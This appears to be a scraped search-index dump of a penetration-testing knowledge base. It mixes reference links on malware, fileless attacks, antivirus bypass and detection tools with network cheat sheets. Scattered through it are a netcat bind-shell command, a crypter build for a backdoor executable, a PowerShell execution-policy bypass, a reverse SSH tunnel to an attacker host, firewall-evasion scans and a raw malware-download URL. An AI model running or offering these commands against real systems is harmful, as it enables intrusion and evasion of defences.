https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/ Malicious Code in Memory Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg \u00e4 nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection Tools Loki - Scanner for Simple Indicators of Compromise https://github.com/Neo23x0/Loki Features File Name IOC Yara Rule Check Hash check C2 Back Connect Check Additional features Regin filesystem check (via --reginfs) Process anomaly check (based on Sysforensics) SWF decompressed scan (new since version v0.8) SAM dump check DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp PE-Sieve process check Signature Base: https://github.com/Neo23x0/signature-base Spark Core: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base libpeconv - A library to load, manipulate, dump PE files: https://github.com/hasherezade/libpeconv PE-Sieve - Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space https://hshrzd.wordpress.com/pe-sieve/ PE Studio - Malware Initial Assessment: https://www.winitor.com/features.html https://www.winitor.com/binaries.html Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r Defense New References Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar YARA Introduction: https://virustotal.github.io/yara/ GitHub: https://github.com/virustotal/yara Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara References Linux - Sandbox - https://github.com/danieluhricek/LiSa New References The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/ vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh https://cybersecurity.att.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"Malware"},{"location":"malware/#malware-analysis","text":"Malware Families https://malpedia.caad.fkie.fraunhofer.de/families AlphaBlend Campaign https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts azorult https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update MuddyWater https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html","title":"Malware Analysis"},{"location":"malware/#collections","text":"Linux https://github.com/tarcisio-marinho/GonnaCry Malware Collections http://iec56w4ibovnb4wc.onion/ http://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ http://185.244.25.217/bins/ Collection Maintenance Tools https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker","title":"Collections"},{"location":"malware/#antivirus-bypass","text":"Tools shellterproject: https://www.shellterproject.com/exclusive-features/ Hyperion i586 - mingw32 - msvc - g ++ Src / Crypter /*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe Python script designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil Python script that takes an automated approach to AV evasion: https://github.com/v-p-b/peCloakCapstone/blob/master/peCloak.py Open source software in Python language which lets you generate customized shellcodes and convert scripts to an obfuscated script: https://www.owasp.org/index.php/OWASP%5FZSC%5FTool%5FProject References Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/ 5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter","title":"Antivirus Bypass"},{"location":"malware/#techniques","text":"PDF Based BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html C2 Techniques dnscat2 - https : // github . com / iagox86 / dnscat2 DropboxC2C - https : // github . com / 0 x09AL / DropboxC2C gcat (Gmail) - https : // github . com / byt3bl33d3r / gcat HTTP/2 Go - https : // github . com / Ne0nd0g / merlin Downloaders PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html","title":"Techniques"},{"location":"malware/#fileless-attacks","text":"New Reference https://www.varonis.com/blog/understanding-malware-free-hacking-part/ Summarized References https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques Malicious Documents New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit Malicious Scripts Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back Living off the Land regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: https://github.com/LOLBAS-Project/LOLBAS Abusing WMI to Build a Persistent, Asynchronous, and Fileless Backdoor: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf APT29\u2019s use of WMI and PowerShell to plant fileless backdoors: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Reference: https://liberty-shell.com/sec/2018/10/20/living-off-the-land/ Malicious Code in Memory Memory injection - VirtualAllocEx and WriteProcessMemory , which allow one process to write code into another process. Overview of the AZORult attack: https://blog.minerva-labs.com/analyzing-an-azorult-attack-evasion-in-a-cloak-of-multiple-layers Wrap compiled executables into scripts that extract malicious payload into memory during runtime. PowerSploit: https://github.com/PowerShellMafia/PowerSploit GhostMiner analysis: https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless Veil Framework: https://www.veil-framework.com/ Process Doppelg \u00e4 nging - attacker misuses NTFS transaction capabilities built into Microsoft Windows to temporarily modify a trusted file in memory without committing changes to disk SynAck malware: https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/ CoffeeShot tool (inject shellcode from Java): https://blog.minerva-labs.com/coffeeshot-avoid-detection-with-memory-injection","title":"Fileless Attacks"},{"location":"malware/#tools","text":"Loki - Scanner for Simple Indicators of Compromise https://github.com/Neo23x0/Loki Features File Name IOC Yara Rule Check Hash check C2 Back Connect Check Additional features Regin filesystem check (via --reginfs) Process anomaly check (based on Sysforensics) SWF decompressed scan (new since version v0.8) SAM dump check DoublePulsar check - tries to detect DoublePulsar backdoor on - port 445/tcp and 3389/tcp PE-Sieve process check Signature Base: https://github.com/Neo23x0/signature-base Spark Core: https://www.nextron-systems.com/spark-core/ Signature Base: https://github.com/Neo23x0/signature-base libpeconv - A library to load, manipulate, dump PE files: https://github.com/hasherezade/libpeconv PE-Sieve - Based on libpeconv. Scans a given process, searching for potentially malicious implants and patches within the process space https://hshrzd.wordpress.com/pe-sieve/ PE Studio - Malware Initial Assessment: https://www.winitor.com/features.html https://www.winitor.com/binaries.html Collecting Hunting for IOCs with gusto and style: https://github.com/rastrea2r/rastrea2r","title":"Tools"},{"location":"malware/#defense","text":"New References Detecting malicious certificates: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cert_payloads.yar YARA Introduction: https://virustotal.github.io/yara/ GitHub: https://github.com/virustotal/yara Rules: https://github.com/Yara-Rules/rules Rules by Neo23x0: https://github.com/Neo23x0/signature-base/tree/master/yara","title":"Defense"},{"location":"malware/#references","text":"Linux - Sandbox - https://github.com/danieluhricek/LiSa","title":"References"},{"location":"malware/#new-references","text":"The Road To Reverse Engineering Malware: https://www.secjuice.com/the-road-to-reverse-engineering-malware/ Unpacking the packed unpacker: https://www.virusbulletin.com/blog/2019/01/ vb2018-paper-unpacking-packed-unpacker-reversing-android-anti-analysis-library/ ELF in-memory execution: https://blog.fbkcs.ru/en/elf-in-memory-execution/ Botnet Takeover (NSA Docs): https://twitter.com/0xffff0800/status/1077052289175609344 An example rootkit that gives a userland process root permissions: https://github.com/PinkP4nther/Sutekh https://cybersecurity.att.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide https://pentestlab.blog/2018/06/06/command-and-control-browser/ https://github.com/0x09AL/Browser-C2","title":"New References"},{"location":"network/","text":"Quick Reference Cheat Sheets Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Quick Reference How to Find Your Public IP Address on Linux Command Line : curl https : // ipaddr . pub MAC to IPv6: https://ben.akrin.com/?p=1347 take the mac address: for example 52 : 74 : f2 : b1 : a8 : 7 f throw ff : fe in the middle: 52:74:f2: ff : fe :b1:a8:7f reformat to IPv6 notation 5274 : f2ff : feb1 : a87f convert the first octet from hexadecimal to binary: 52 - 01010010 invert the bit at index 6 (counting from 0): 01010010 - 01010000 convert octet back to hexadecimal: 01010000 - 50 replace first octet with newly calculated one: 5074 : f2ff : feb1 : a87f prepend the link-local prefix: fe80 :: 5074 : f2ff : feb1 : a87f https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6 format_eui_64 () { local macaddr = $1 printf %02x%s $ (( 16 #$ { macaddr : 0 : 2 } ^ 2 # 00000010 )) ${macaddr:2} \\ | sed - E - e s / ([ 0 - 9 a - zA - Z ]{ 2 }) */ 0 x \\ 0 |/ g \\ | tr - d : \\ n \\ | xargs - d | \\ printf %02x%02x:%02xff:fe%02x:%02x%02x } HTTP Request with / dev / tcp exec 3 /dev/tcp/ ( INTERNAL IP ADDRESS ) /80 echo -e GET / HTTP/1.1\\r\\nHost: (INTERNAL IP ADDRESS)\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0 (X11;Linux x86_64...) Gecko/20100101 Firefox/60.0\\r\\n\\r\\n 3 cat 3 TCP Flag Key: http://rapid.web.unc.edu/resources/tcp-flag-key/ Network Discovery nmap - sP 192 . 168 . 1 . 1 - 255 ettercap - T - i eth0 /// netdiscover - i ens33 IPv6 ping ( TARGET IP ADDRESS ) arp - a Port Scanning FPing: for ip in $ ( seq 1 254 ) ;do fping 10.11.1.$ip fping.txt;done;grep alive ./fping.txt Nc: for ip in $ ( seq 1 5 ) ; do nc -nvv -z 192.168.1.$ip 80 /tmp/ncscan.txt done nc - z - v ( TARGET IP ADDRESS ) 1 - 1024 2 / dev / stdout | grep - v refused ARP ping: nmap - sP - PR 10 . 11 . 1 . 0 / 24 - oG nmap - arp . txt Ping: for ip in $ ( seq 1 254 ) ;do ping -c 1 192.168.1.$ip | grep bytes from | cut -d -f4 | cut -d : -f1 done /dev/tcp: for port in $ ( seq 1 65530 ) ; do (echo $port /dev/tcp/$target/$port printf [!] $port is open.\\n ) 2 /dev/null done Port monitor watch -n1 nc -w1 -nvz 192 .168.1.23 123 # -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner Nmap: Evade Firewall - sA - TCP ACK Scan Because of the ACK packets the firewall cannot create the log Firewalls treat ACK packet as the response of the SYN packet - Open port (few ports in the case of the firewall) Closed port (most ports are closed because of the firewall) Filtered (Nmap is not sure whether the port is open or not) Unfiltered (Nmap can access the port but is still confused about the open status of the port) - sW - TCP Window Scan Designed to differentiate between open and closed ports instead of showing unfiltered Does not open any active session with the target computer Send ACK packets and receive a single RST packet in response - f , - ff - Fragment Packets - spoof - mac Cisco - Spoof MAC - scan_delay - control the delay between each and every request - host - timeout Types of port scans TCP Connect Scan: nc - nvv - w 1 - z ip port - range Full 3 way handshake SYN / Stealth Scan Send SYN SYN-ACK means open RST means closed UDP Scanning: nc - nv - u - z - w 1 ip port - range ICMP port unreachable means closed No response means open Port Knocking: for x in 1111 , 2222 , 3333 ; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b / etc / knockd . conf \u200b Scanning Methods All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate = 1000 -e tun0 -p1-65535,U:1-65535 ports ports = $( cat ports | awk -F {print $4} | awk -F / {print $1} | sort -n | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP and UDP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP nmap -sS -T5 -A -f -v IP nmap -n -Pn -sV --version-all --open -sC -oA [ target ] --stats-every 120 nmap -T4 -sV -sC -Pn [ box ip ] -oA [ box_name ] _initial_scan Vulnerability Scanning Nmap nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip OpenVAS openvas - setup https : // ip : 9392 Port Forwarding / Tunneling Local: ssh gateway -L local port to listen : remote host : remote port Remote: ssh gateway -R remote port to bind : local host : local port Dynamic: ssh gateway -D port to bind Local: plink.exe gateway -L local port to listen : remote host : remote port Remote: plink.exe gateway -R remote port to bind : local host : local port Dynamic: plink.exe gateway -D port to bind Local Port Forwarding https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot ssh -L local-port-to-listen : remote-host : remote-port gateway Allow connections to a specific blocked server. From work login to home and use it as a gateway to access banned - site . com : 80 : ssh -L 9001 :banned-site.com:80 user@home #work curl http://localhost:9001 #home ssh -L 9001 :banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001 :banned:22 user@home -g ssh -p 9001 work_machine #remotely Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000. ssh -L 9000 :localhost:5432 user@server psql -h localhost -p 9000 Remote Port Forwarding https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot Allow remote access to restricted network. Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost : 9001 in home will forward user to intra:22 ssh -R 9001 :intra-ssh-server:22 user@home #work ssh -p 9001 localhost #home Add GatewayPorts yes to sshd_config to listening on all interfaces. Allow public access to a local resource through a public server. ssh -R 9000 :localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart Dynamic port forwarding One local port for tunneling data to all remote destinations (SOCKS protocol) ssh -D 9001 home Quick Reference Monitoring Tunnels: netstat - tunelp Avoid TTL: - nNT Creating reverse SSH client to tunnel-out remote desktop port FROM remote non-routable machine pling -l root -pw password attacker-ip -R 3390 :127.0.0.1:3389 # localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390 SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs) Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127 .0.0.1 8080 proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range Tools rinetd When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389) nano / etc / rinetd . conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4 , 4 a , 5 HTTP CONNECT SCTP ( by Darren Martyn @ info_dox ) WebSocket DNS ( A / CNAME , PRIVATE , NULL ) - Proof of Concept RDP ( Windows only ) https://github.com/sshuttle/sshuttle https://github.com/klsecservices/rpivot https://github.com/wolfSSL/wolfssh https://github.com/jpillora/chisel References https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html New References https://vimeo.com/54505525 Tools Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit Sparta: https://github.com/SECFORCE/sparta BetterCap - Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter Nmap Port Related Information: / usr / share / nmap / nmap - servies ICMP (Ping) Sweep: nmap - sn pi - rage nmap - sn ip - range - oG filename ( grepable format ) Sweep TCP/UDP ports: nmap - p 80 ip - range - oG filename Sweep full network for top ports: nmap - sT - A --top-ports=20 ip-range -G filename Script engine: ls - l / usr / share / nmap / scripts | grep smb Important flags - O for OS Fingerprinting - sV for banner grabbing Netstat Kernel IP routing table: netstat - nr Listening ports: netstat - lp netstat - lvnp Netcat Cheat sheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf General Commands Listen on port 567/TCP: nc - l - p 567 Connecting to 567 of 1.2.3.4: nc 1 . 2 . 3 . 4 5676 Pipe a text file to the listener: cat infile | nc 1 . 2 . 3 . 4 567 - q 10 Have the listener save a received text file: nc - l - p 567 textfile Transfer a directory: Reciever: nc - l - p 678 | tar xvfpz Sender: tar zcfp - / path / to / directory | nc - w 3 1 . 2 . 3 . 4 678 Send a message to your syslog server (the 0 means emerg): echo 0 message | nc - w 1 - u syslogger 514 Setup a remote shell listener: nc - v - e /bin/bash - l - p 1234 - t nc l p 1234 e c:\\windows\\system32\\cmd.exe Make an HTTP request: echo - e GET http://www.google.com HTTP/1.0nn | nc - w 5 www . google . com 80 One-page webserver: cat homepage . txt | nc - v - l - p 80 General Options Use IPv4 addressing only: nc - 4 [ options ] [ host ] [ port ] Use IPv6 addressing only: nc - 6 [ options ] [ host ] [ port ] UDP instead of TCP: nc - u [ options ] [ host ] [ port ] Listen for an incoming connection: nc - l [ host ] [ port ] Continue listening after client has disconnected: nc - k - l [ host ] [ port ] No DNS lookups: nc - n [ host ] [ port ] Use specific source port: nc - p [ source port ] [ host ] [ port ] Use source IP: nc - s [ source ip ] [ host ] [ port ] Apply 'n' second timeout: nc - w [ timeout ] [ host ] [ port ] Verbose output: nc - v [ host ] [ port ] Port Scanning Scan a single TCP port: nc - zv hostname . com 80 Scan a range of ports: nc - zv hostname . com 80 - 84 Scan multiple ports: nc - zv hostname . com 80 84 Other One page web server: while : ; do ( echo -ne HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c index.html)\\r\\n\\r\\n ; cat index.html; ) | nc -l -p 8080 ; done Proxy: mknod backpipe p ; nc - l [ proxy port ] backpipe | nc [ destination host ] [ destination port ] pipe Wrap readline history library (support up arrow, etc): rlwrap nc - t remotehost 23 References: https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index http://workrobot.com/sysadmin/security/netcat_cheatsheet.html Techniques Domain Fronting Tools Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek References Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php Traffic Analysis Accounting Traffic #!/bin/bash # Reset counters and iptables rules iptables -Z iptables -F # Measure incoming traffic from lab machine iptables -I INPUT 1 -s 192 .168.1.23 -j ACCEPT # Measure outgoing traffic to lab machine iptables -I OUTPUT 1 -d 192 .168.1.23 -j ACCEPT watch - n 1 iptables - nvL Using a Capture: aircrack - ng captured . cap \u200b Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/ https://wiki.wireshark.org/SampleCaptures PA Toolkit (Pentester Academy Wireshark Toolkit) - PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter: https://github.com/pentesteracademy/patoolkit CapAnalysis: https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download Netsh (Windows) netsh trace show capturefilterhelp netsh trace show scenarios netsh trace show globalkeywordsandlevel netsh trace start capture = yes IPv4 . Address = 192 . 168 . 122 . 2 netsh trace start scenario = InternetClient , InternetServer , NetConnection globalLevel = win : Verbose capture = yes report = yes traceFile = C : \\ temp \\ trace \\ trace001 . etl netsh trace stop Use Microsoft Network Monitor 3.4 to view: https://www.microsoft.com/en-us/download/details.aspx?id=4865 Convert to PAC from: https://github.com/microsoft/etl2pcapng Use powershell to convert: $s = New-PefTraceSession -Path \u201c C : \\ output \\ path \\ spec \\ OutFile . Cap \u201d -SaveOnStop $s | Add-PefMessageProvider -Provider \u201c C : \\ input \\ path \\ spec \\ Input . etl \u201d $s | Start-PefTraceSession tcpdump to show HTTP request/response headers https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump sudo tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep --line-buffered ^........(GET |HTTP\\/|POST |HEAD )|^[A-Za-z0-9-]+: | sed -r s/^........(GET |HTTP\\/|POST |HEAD )/\\n\\1/g sudo stdbuf -oL -eL /usr/sbin/tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep -a --line-buffered .+(GET |HTTP\\/|POST )|^[A-Za-z0-9-]+: | perl -nle BEGIN{$|=1} { s/.*?(GET |HTTP\\/[0-9.]* |POST )/\\n$1/g; print } tcpdump tcpdump - i eth1 - s 0 port not 22 tcpdump - i eth1 - s 0 port not 22 and port not 53 tcpdump - i eth1 port not 22 and host 1 . 2 . 3 . 4 TSHark General Supported network interfaces: tshark - D Sniff on eth0: tshark - i eth0 Open pcap : tshark - r HTTP_traffic . pcap Read 100 packets from pcap : tshark - r HTTP_traffic . pcap - c 100 Print full details for first 10 Packets: tshark - r HTTP_traffic . pcap - c 10 - V List of protocols in pcap : tshark - r HTTP_traffic . pcap - z io , phs - q Export into PDML: tshark - r HTTP_traffic . pcap - T pdml http . xml PDML to HTML: xsltproc / usr / share / wireshark / pdml2html . xsl http . xml http . html HTTP Only the HTTP traffic: tshark - Y http - r HTTP_traffic . pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests: tshark - r HTTP_traffic . pcap - Y http.request.method==GET Print only source IP and URL for all GET request packets: tshark - r HTTP_traffic . pcap - Y http.request.method==GET - Tfields - e frame . time - e ip . src - e http . request . full_uri Packets contain the \"password\" string: tshark - r HTTP_traffic . pcap - Y http contains password \u201d Destination IP for GET requests sent to New York Times ( www.nytimes.com ): tshark - r HTTP_traffic . pcap - Y http.request.method==GET http.host==www.nytimes.com - Tfields - e ip . dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: tshark - r HTTP_traffic . pcap - Y ip contains amazon.in ip.src==192.168.252.128 - Tfields - e ip . src - e http . cookie Type of OS 192.168.252.128 is using: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 http - Tfields - e http . user_agent HTTPS Only show SSL traffic?: tshark - r HTTPS_traffic . pcap - Y ssl Only print the source IP and destination IP for all SSL handshake packets: tshark - r HTTPS_traffic . pcap - Y ssl.handshake - Tfields - e ip . src - e ip . dst List issuer name for all SSL certificates exchanged: tshark - r HTTPS_traffic . pcap - Y ssl.handshake.certificate - Tfields - e x509sat . printableString Print the IP addresses of all servers accessed over SSL: tshark - r HTTPS_traffic . pcap - Y ssl ssl.handshake.type==1 - Tfields - e ip . dst IP addresses associated with Ask Ubuntu servers (askubuntu.com): tshark - r HTTPS_traffic . pcap - Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark - r HTTPS_traffic . pcap - Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 - Tfields - e ip . src What DNS servers were used: tshark - r HTTPS_traffic . pcap - Y dns dns.flags.response==0 - Tfields - e ip . dst Name of the antivirus solution: tshark - r HTTPS_traffic . pcap - Y ip contains avast - Tfields - e ip . src WiFi Show only WiFi traffic: tshark - r WiFi_traffic . pcap - Y wlan View the deauthentication packets: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c Display WPA handshake packets: tshark - r WiFi_traffic . pcap - Y eapol Print the SSID and BSSID values for all beacon frames: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==8 - Tfields - e wlan . ssid - e wlan . bssid What is BSSID of SSID \"LazyArtists\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==LazyArtists - Tfields - e wlan . bssid Channel of SSID \"Home_Network\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==Home_Network - Tfields - e wlan_radio . channel Devices that received deauth messages: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c - Tfields - e wlan . ra Which device does MAC 5c:51:88:31:a0:3b belongs to: tshark - r WiFi_traffic . pcap - Y wlan.ta==5c:51:88:31:a0:3b http - Tfields - e http . user_agent Beacon frames present: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 Unique list of all AP BSSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . bssid | sort | uniq Unique list of all AP SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid | sort | uniq Only non-null SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0) - T fields - e 